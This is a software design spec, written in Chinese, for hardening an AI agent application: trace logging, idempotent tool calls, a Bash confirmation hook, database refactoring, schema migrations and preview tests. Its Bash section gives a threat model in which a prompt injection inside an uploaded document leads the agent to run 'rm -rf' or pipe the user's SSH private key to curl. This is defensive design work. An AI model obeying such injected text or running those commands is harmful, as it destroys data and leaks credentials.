# 架构加固 Spec：Trace 完整化、幂等接入、Bash 沙箱、DB 拆分、迁移版本化、预览渲染测试

**版本**: v1.0
**日期**: 2026-06-07
**作者**: 架构 review
**状态**: 待执行
**前置**: `spec-home-kingdee.md` 的 mid-flight 改动需先提交收口；本 spec 在其之上叠加

---

## 0. 背景

本 spec 来自一次架构 review，针对以下 6 个问题：

| 编号 | 问题 | 现状 | 风险 |
|---|---|---|---|
| WP1 | `agent_traces` 写入不完整 | `writeAgentTrace()` 只写 7 列，token/usage/retry 全空，streaming 路径 `total_ms = 0` | 可观测性失真，无法用于成本分析 |
| WP2 | `export_kingdee_draft` 未接幂等 | `withIdempotency()` 已实现，但 `kingdee-tools.ts` 未套用 | 重复点击/网络重试可能产生重复草稿 |
| WP3 | Agent Bash 权限不受 hook 限制 | `permissionMode:"acceptEdits"` + `cwd = projectRoot` + Bash 不在 `path-safety` 拦截范围 | 文档注入可执行任意 shell |
| WP4 | `lib/db/sqlite.ts` 1224 行 God-file | schema/DDL/查询/类型混在一起 | 维护成本，PR diff 噪音 |
| WP5 | 无 schema 版本管理 | `addColumnIfMissing` 散落 + `CREATE TABLE IF NOT EXISTS` 每次启动跑 | 列改名/删除/类型变更无路径 |
| WP6 | 文件预览测试是字符串匹配 | `tests/file-preview.test.ts` 用 string-contains 检查源码 | 重构会悄悄失效 |

WP1 由用户明确点名要"实现 trace 写入"；其余按 review 建议落地。

---

## WP1：Trace 写入完整化

### 现状

`app/api/agent/query/route.ts:330-342` 的 `writeAgentTrace()` 签名：

```ts
function writeAgentTrace(
  traceId, conversationId, startedAt, modelUsed, toolCallCount, errorMessage, routerPath
)
```

只写 `trace_id, conversation_id, started_at, ended_at, total_ms, model_used, router_path, tool_call_count, error_message` 9 个字段。

`agent_traces` 表实际有 14 列（`sqlite.ts:234-250`）：还缺 `user_id, prompt_tokens, completion_tokens, cache_read_tokens, cache_creation_tokens, retry_count`。

调用点 bug：
- `route.ts:276`（streaming 完成路径）传 `startedAt = Date.now()` → `total_ms` 永远是 0
- `route.ts:142`（解析失败 catch）`tool_call_count` 传 0，OK
- `route.ts:282`（streaming 错误路径）同 276 的 bug

### 目标

每个请求结束后，`agent_traces` 一行包含所有可拿到的字段，token 计数非空（除非 SDK 未返回 usage）。

### 实现

#### WP1.1 `claude-adapter.ts` 暴露 usage 与 retry

`lib/agent/claude-adapter.ts:317-322` 返回值扩展为：

```ts
return {
  mode: "claude" as const,
  claudeSessionId,
  content,
  thinking: thinkingChunks.join("").trim() || undefined,
  usage: usageSnapshot,     // 新增
  toolCallCount,            // 新增
  retryCount,               // 新增（sessionRetried ? 1 : 0）
};
```

- `usageSnapshot` 类型：`{ inputTokens: number; outputTokens: number; cacheReadTokens: number; cacheCreationTokens: number } | null`
- 来源：监听 `message.type === "result" && subtype === "success"` 时读取 `(message as SDKResultSuccess).usage`（line 223-225 已经在拿 `result`，同处读 usage）
- `toolCallCount`：累加 `tool_use` block 出现次数（line 265 已经在遍历，加计数器）
- `retryCount`：复用现有 `sessionRetried` 布尔，转 0/1

streaming 路径（`runClaudeAgentStream` 如果有，否则在 `app/api/agent/query/route.ts` 的 streaming 分支）同样把 usage/toolCallCount 暴露到外层。

#### WP1.2 `writeAgentTrace` 签名扩展

```ts
function writeAgentTrace(input: {
  traceId: string;
  conversationId?: number;
  userId?: string;            // 暂用 'default-user'
  startedAt: number;          // ms timestamp，请求开始
  modelUsed: string;
  routerPath: string | null;
  toolCallCount: number;
  retryCount: number;
  usage: { inputTokens: number; outputTokens: number; cacheReadTokens: number; cacheCreationTokens: number } | null;
  errorMessage: string | null;
}): void
```

INSERT 语句：

```sql
INSERT OR REPLACE INTO agent_traces (
  trace_id, conversation_id, user_id,
  started_at, ended_at, total_ms,
  model_used, router_path,
  prompt_tokens, completion_tokens, cache_read_tokens, cache_creation_tokens,
  tool_call_count, retry_count, error_message
) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
```

`total_ms = Date.now() - startedAt`（用调用方传入的 startedAt，不是函数内部 Date.now）。

#### WP1.3 修复调用点

- `route.ts:142`（解析失败）：`startedAt` 用顶部 `startedAt`，不是当前时间；`usage = null`；`toolCallCount = 0`；`retryCount = 0`
- `route.ts:276`（streaming 成功）：传入顶部 `startedAt`（不是 `Date.now()`）；`usage / toolCallCount / retryCount` 从 adapter 返回的对象取
- `route.ts:282`（streaming 失败）：同上，`errorMessage` 填 `msg`
- `route.ts:322`（非 streaming 成功）：同上

所有调用点改为对象参数形式，避免位置参数继续被传错。

### 验收

- [ ] `SELECT COUNT(*) FROM agent_traces WHERE prompt_tokens IS NULL AND created_at > date('now')` = 0（除非 SDK 未返回 usage）
- [ ] `SELECT total_ms FROM agent_traces ORDER BY started_at DESC LIMIT 10` 全部 > 0
- [ ] 触发一次 session resume retry，对应行 `retry_count = 1`
- [ ] 一次包含 ≥ 3 个工具调用的对话，`tool_call_count >= 3`
- [ ] 单元测试 `tests/smoke.test.ts` 加 case：mock SDK 返回带 usage 的 result，断言 trace 行 token 列非空

### 不做

- 不引入独立的 trace SDK / OpenTelemetry — 当前 SQLite 落表已够用
- 不做 trace span 嵌套（子 agent 单独 trace）— 留 WP1.x 后续
- 不做 30 天保留任务 — 已在 `spec-agent-production-upgrade.md` 列为 TODO

---

## WP2：`export_kingdee_draft` 接入幂等

### 现状

`lib/agent/tools/idempotency.ts` 的 `withIdempotency()` 已实现：读缓存、写 `tool_executions`、`riskLevel ∈ {medium, high}` 时写 `audit_logs`。

`lib/agent/mcp-tools/kingdee-tools.ts:96-170` 的 `exportDraftHandler` 直接用 `wrapToolHandler`，**没有套 `withIdempotency`**。`idempotency_key` 参数被 destructure 但只是丢弃。

### 目标

同一 `idempotency_key + tool_name` 二次调用返回首次结果（含错误结果）。`tool_executions` 表有真实写入。`audit_logs` 对应 `event_type='tool_exec'` 行出现。

### 实现

`kingdee-tools.ts` 改造：

```ts
import { withIdempotency } from "@/lib/agent/tools/idempotency";

// exportDraftHandler 外面套一层
const exportDraftHandlerCore = wrapToolHandler(exportDraftSchema, async (args) => {
  // 原有实现保持不变
});

const exportDraftHandler = withIdempotency(
  "export_kingdee_draft",
  exportDraftHandlerCore,
  { riskLevel: "high" }
);
```

注意：`withIdempotency` 当前签名 `(toolName, handler, opts)`，`opts.traceId` 暂不传（MCP 工具拿不到 traceId）。如果要打通 traceId，需要扩 MCP tool context — 不在本 spec。

`query_kingdee_accounts`（只读）和 `validate_kingdee_voucher`（只读）**不套**幂等，避免污染 `tool_executions` 表。

### 验收

- [ ] 同 `idempotency_key` 二次调用 `export_kingdee_draft` 返回的 `draftId` 相同
- [ ] `SELECT COUNT(*) FROM tool_executions WHERE tool_name = 'export_kingdee_draft'` 在两次调用后 = 1
- [ ] `SELECT COUNT(*) FROM audit_logs WHERE event_type = 'tool_exec'` 在两次调用后 ≥ 1
- [ ] `tests/smoke.test.ts` 中已有的 Kingdee MCP 测试加幂等 case

### 不做

- 不实现 `tool_executions` 的 30 天清理任务（保持 spec-agent-production-upgrade.md 一致）
- 不改 `withIdempotency` 本身

---

## WP3：Bash 沙箱（高优先级安全项）

### 现状

`lib/agent/claude-adapter.ts:171-183`：

```ts
cwd: getProjectRoot(),
tools: { type: "preset", preset: "claude_code" },
allowedTools,
permissionMode: "acceptEdits",
```

- `cwd` 是项目仓库根，Agent 的 `Bash` / `Write` 默认相对路径落在仓库里
- `path-safety` hook 只拦 `Write / Edit / MultiEdit`，`Bash` 不在范围（`built-in.ts:30`）
- `Bash` 在 `TOOL_REGISTRY` 标 `high`，但 `BASE_TOOLS` 不含它；只要某个 skill 把 Bash 加进 `tools` 列表就能用
- `permissionMode:"acceptEdits"` 表示 Edit/Write 自动放行（写回的还是 `canUseTool` 钩子）

威胁模型：用户上传一份 Excel/PDF，文档内嵌 prompt 注入，诱导 Agent 启用某个含 Bash 的 skill 后 `rm -rf` 或 `cat ~/.ssh/id_rsa | curl ...`。

### 目标

默认 deny Bash；只在用户**当次会话**显式确认后允许，且 cwd 限制在 `outputDir`。

### 实现

#### WP3.1 新增 `createBashSandboxHook`

`lib/agent/hooks/built-in.ts` 加：

```ts
export function createBashSandboxHook(): Hook {
  return {
    name: "bash-sandbox",
    async before(ctx): Promise<BeforeToolResult> {
      if (ctx.toolName !== "Bash") return { action: "allow" };
      // Bash 一律走 confirm（即使 risk-confirm 因 skill 配置放行也要二次拦）
      return {
        action: "confirm",
        prompt: "Agent 即将执行 shell 命令，确认继续？",
      };
    },
  };
}
```

在 `claude-adapter.ts:133-140` 的 hookChain 里加在 `createPathSafetyHook` 之后、`createRiskConfirmHook` 之前。

#### WP3.2 cwd 切到 outputDir

`claude-adapter.ts:171`：

```ts
cwd: outputDir,           // 不再用 getProjectRoot()
```

`outputDir` 已经是 `path.join(getConversationFilesDir(conversationId), "generate")` 或 tmpdir 下的隔离目录，Bash 默认相对路径就限制在沙箱里。

影响检查：
- `Read / Glob / Grep` 是否依赖 cwd = 仓库根？**是**，需要在 SDK 调用时传绝对路径，或保持当前行为不变。考虑到只有 `Bash` 是危险源，更小的改法是：**保留 cwd = projectRoot，但 `Bash` 通过 hook deny**，不动 cwd。

**推荐方案**：cwd 保持不变，靠 WP3.1 的 hook 拦 Bash。简单、可逆、不影响其他工具。

#### WP3.3 `BASE_TOOLS` 不含 Bash（已是现状），文档化

`lib/agent/tools/registry.ts:38` 的 `BASE_TOOLS` 已经不含 Bash。在文件顶部加注释说明"Bash 不入 BASE，仅 skill 可选 opt-in，且需 confirm"。

### 验收

- [ ] 触发任意 Bash 调用，UI 弹确认对话；拒绝后 SDK 看到 `deny`，工具不执行
- [ ] 单元测试 mock 一个 hook ctx 调用 `bash-sandbox.before`，断言 `action === "confirm"`
- [ ] `tests/smoke.test.ts` 增加 case：构造带 Bash 工具调用的对话，断言走到 confirm 分支

### 不做

- 不做命令白名单（如只允许 `ls/cat/grep`）— 用户已经在确认环节，再做白名单是重复防御
- 不切 cwd（理由见 WP3.2）

---

## WP4：拆分 `lib/db/sqlite.ts`

### 现状

`lib/db/sqlite.ts` 1224 行，混了：
- schema DDL + migration（`initializeSchema`, `addColumnIfMissing`, `migrateChunksToVec`）
- 类型定义（`ChatConversation`, `ChatMessage`, ...）
- 查询函数（chat / knowledge / memory / cockpit / audit / trace）

### 目标

按域拆分。每个域 < 300 行，单一职责。`getDb()` 单例和 schema 初始化集中在一处。

### 实现

新目录结构：

```
lib/db/
  sqlite.ts                  # 仅 getDb()、关闭、WAL 配置；re-export 所有子模块（向后兼容）
  schema.ts                  # initializeSchema + addColumnIfMissing + 所有 CREATE TABLE
  migrations/
    001-init.ts              # 已落地的初始 schema（占位）
    002-trace-id.ts          # addColumnIfMissing chat_agent_events.trace_id 等
    003-kingdee.ts           # tool_executions, agent_traces
    runner.ts                # 顺序跑 migrations，写 schema_migrations 表
  queries/
    chat.ts                  # createChatConversation, insertChatMessage, ...
    knowledge.ts             # knowledge_documents/chunks/fts/vec 全套
    memory.ts                # memory_entries CRUD
    cockpit.ts               # getRecentActivityFeed, getTopToolsLast24h, ...
    audit.ts                 # insertAuditLog + audit_logs 查询
    traces.ts                # writeAgentTrace + agent_traces 查询
  types.ts                   # 所有跨模块共享类型
```

迁移策略：
1. 先抽 `types.ts`，全文件 import 切到 `@/lib/db/types`
2. 再抽 `schema.ts`（保持 `initializeSchema` 签名不变）
3. 按域抽 `queries/*.ts`，每抽一个跑一次 `npm test`
4. `sqlite.ts` 改为：

```ts
export { getDb } from "./connection";
export * from "./schema";
export * from "./queries/chat";
export * from "./queries/knowledge";
// ...
```

保证现有 `import { ... } from "@/lib/db/sqlite"` 全部继续工作。

### 验收

- [ ] `sqlite.ts` < 50 行（只剩 re-export）
- [ ] 每个 `queries/*.ts` < 300 行
- [ ] `npm test` 全绿
- [ ] `grep -r "from \"@/lib/db/sqlite\"" --include="*.ts" | wc -l` 不减少（向后兼容）

### 不做

- 不引入 ORM（Drizzle/Prisma）— 当前手写 prepare 已经够用，迁移成本不值
- 不做 query builder

---

## WP5：Schema 版本化（依赖 WP4）

### 现状

- `addColumnIfMissing` 散落在 `initializeSchema` 各处，`CREATE TABLE IF NOT EXISTS` 每次启动跑
- 列重命名/删除/类型变更没有路径，只能新加列
- 没有"当前 schema 版本"概念

### 目标

引入 `schema_migrations(version, name, applied_at)` 表 + 顺序执行 migration 函数，每个 migration 是不可变 `001-xxx.ts`。

### 实现

#### WP5.1 `schema_migrations` 表

```sql
CREATE TABLE IF NOT EXISTS schema_migrations (
  version INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
  applied_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
);
```

#### WP5.2 Migration runner

`lib/db/migrations/runner.ts`：

```ts
type Migration = { version: number; name: string; up: (db: DatabaseSync) => void };

const MIGRATIONS: Migration[] = [
  { version: 1, name: "init", up: m001 },
  { version: 2, name: "trace-id-columns", up: m002 },
  { version: 3, name: "kingdee-and-traces", up: m003 },
];

export function runMigrations(db: DatabaseSync): void {
  db.exec("CREATE TABLE IF NOT EXISTS schema_migrations (...)");
  const applied = new Set(
    (db.prepare("SELECT version FROM schema_migrations").all() as { version: number }[])
      .map(r => r.version)
  );
  for (const m of MIGRATIONS) {
    if (applied.has(m.version)) continue;
    console.info("[migrations] applying", m.version, m.name);
    db.exec("BEGIN");
    try {
      m.up(db);
      db.prepare("INSERT INTO schema_migrations (version, name) VALUES (?, ?)").run(m.version, m.name);
      db.exec("COMMIT");
    } catch (e) {
      db.exec("ROLLBACK");
      throw e;
    }
  }
}
```

#### WP5.3 首次落地策略

现有库已经有所有表。`m001-init.ts` 的 `up` 应该是当前 `initializeSchema` 的完整内容（`CREATE TABLE IF NOT EXISTS ...` 全部）— **幂等的**。对已存在的 DB，`schema_migrations` 表初始为空，runner 跑 m001，所有 `IF NOT EXISTS` 跳过，然后插入 `(1, 'init')`。

未来变更（如要给 `agent_traces` 加 `user_email` 列）：新建 `m004-user-email.ts`，里面只跑 `ALTER TABLE agent_traces ADD COLUMN user_email TEXT`。

旧 DB 升级时 `applied` 不含 4，runner 跑 m004，插入 `(4, 'user-email')`。

#### WP5.4 删除 `addColumnIfMissing`

收口后，`addColumnIfMissing` 退役。所有 ALTER 走 migration 文件。

### 验收

- [ ] 新建 DB 跑 `getDb()` 后 `SELECT * FROM schema_migrations ORDER BY version` 返回所有 migration 行
- [ ] 旧 DB 升级后同上，且数据完整
- [ ] 故意写一个会失败的 migration，断言事务回滚、`schema_migrations` 不留行
- [ ] `addColumnIfMissing` 在 `lib/db/` 外的引用 = 0

### 不做

- 不做 `down` migration（SQLite 单机本地库，回滚靠备份文件）
- 不做 migration CLI（`npm run migrate`）— `getDb()` 启动期跑即可

---

## WP6：文件预览真实渲染测试

### 现状

`tests/file-preview.test.ts` 是字符串包含检查：

```ts
test("preview page imports react-pdf", () => {
  const content = readFileSync("app/shared/file-preview-page.tsx", "utf8");
  assert.ok(content.includes("react-pdf"));
});
```

重构（如换库、改 import 路径）时不报错，但功能可能已坏。

### 目标

至少在 jsdom 环境下挂载 `FilePreviewPage` 组件并断言 DOM 节点正确出现。

### 实现

#### WP6.1 引入 jsdom + happy-dom

依赖：`happy-dom`（比 jsdom 轻）+ `@testing-library/react`。

#### WP6.2 重写 `tests/file-preview.test.ts`

```ts
import { Window } from "happy-dom";
import { render, screen } from "@testing-library/react";
import FilePreviewPage from "@/app/shared/file-preview-page";

const window = new Window();
globalThis.document = window.document as any;
globalThis.window = window as any;

test("preview page renders PDF placeholder for application/pdf", async () => {
  render(<FilePreviewPage fileUrl="/api/files/1/foo.pdf" mimeType="application/pdf" />);
  expect(await screen.findByTestId("pdf-preview")).toBeTruthy();
});

test("preview page renders Excel grid for xlsx", async () => {
  render(<FilePreviewPage fileUrl="/api/files/1/foo.xlsx" mimeType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" />);
  expect(await screen.findByTestId("excel-preview")).toBeTruthy();
});

// docx, txt, image, unsupported 同理
```

需要在 `FilePreviewPage` 的每个分支加 `data-testid` 属性（小改动）。

#### WP6.3 测试运行配置

当前是 `node --import tsx tests/all.test.ts`。如果不想换 runner，让 `file-preview.test.ts` 在 import 处自检 `happy-dom` 是否可用，跑不动时 skip 并打印警告。

### 验收

- [ ] 6 种文件类型（PDF / Excel / DOCX / TXT / 图片 / 不支持）各一个 case
- [ ] 删掉 `file-preview-page.tsx` 里的 PDF 渲染分支，对应 case 立即红
- [ ] CI 跑 `npm test` 全绿

### 不做

- 不引入 Playwright/Cypress E2E — 太重，本地单机 app 不值
- 不测试真实文件下载/渲染像素 — DOM 存在即认为渲染逻辑分支命中

---

## 执行顺序

1. **先收口 `spec-home-kingdee.md` 的 mid-flight 改动**，确保仓库可发布
2. WP1（trace）+ WP2（幂等）— 都是后端独立改动，可并行；预估 0.5 天
3. WP3（Bash hook）— 独立，0.5 天
4. WP4（DB 拆分）— 1.5 天，是 WP5 前置
5. WP5（migration runner）— 0.5 天，依赖 WP4
6. WP6（预览测试）— 0.5 天，独立

总计 ~3.5 天工作量。

## 退路 / 风险

| WP | 风险 | 缓解 |
|---|---|---|
| WP1 | SDK usage 字段未来变名 | 在 adapter 内做 null-safe 解构，写表写 null |
| WP2 | `withIdempotency` 对 MCP 返回结构有假设 | 已经在用 `wrapToolHandler` 同样的返回 shape，兼容 |
| WP3 | confirm 流没接通会卡住 Bash | adapter 已有 `resolveUserQuestion`，复用 |
| WP4 | re-export 大动可能漏导致编译错 | 每抽一个域跑一次 build + test |
| WP5 | 旧 DB 没 `schema_migrations` 表 | runner 第一行 `CREATE TABLE IF NOT EXISTS`，幂等 |
| WP6 | happy-dom 不支持 react-pdf canvas | 用 mock 替换 react-pdf 模块即可 |
